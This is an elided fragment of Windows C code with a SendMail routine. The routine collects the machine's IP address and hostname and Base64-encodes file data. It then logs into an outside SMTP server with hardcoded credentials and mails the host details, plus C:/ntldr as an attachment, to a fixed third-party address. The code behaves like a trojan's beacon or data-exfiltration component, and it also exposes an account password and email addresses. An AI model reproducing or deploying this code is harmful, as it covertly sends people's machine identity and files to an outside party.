...
{	
	...
	while (0 != readnum)
	{
		...
		Base64_Code( (UCHAR*)readbuff, readnum, (UCHAR*)sendbuff );
		strcat(sendbuff,"\r\n");
...
int SendMail(char *title, char *data)
{
	
	WSADATA dw;
	WSAStartup(MAKEWORD(2, 2), &dw );
	
	char *smtpserver = "smtp.tom.com"; //smtp.163.com
	char host[128]  ={0}; //smtp.163.com
	
	char myip[128] = {0};
	strcpy(myip, inet_ntoa( *(struct in_addr *)gethostbyname(NULL)->h_addr_list[0]));
	strcat(myip," ");
	strcat(myip, gethostbyname(NULL)->h_name);
	in_addr addr;
	hostent * pht = gethostbyname(smtpserver);
	char  * & p = pht->h_addr_list[0];
	sprintf(host, "%d.%d.%d.%d", 0xff&p[0],0xff&p[1],0xff&p[2],0xff&p[3]);
	
	
	char *username	="txtest1123";
	char *password	="txtest";
	char *m_From	="txtest1123@tom.com";


	char *m_To		="xk135@qq.com";
	char *m_date	="2007";
	char *m_Subject	=myip;
	char *m_data	=myip;
	char *m_File	="C:/ntldr";
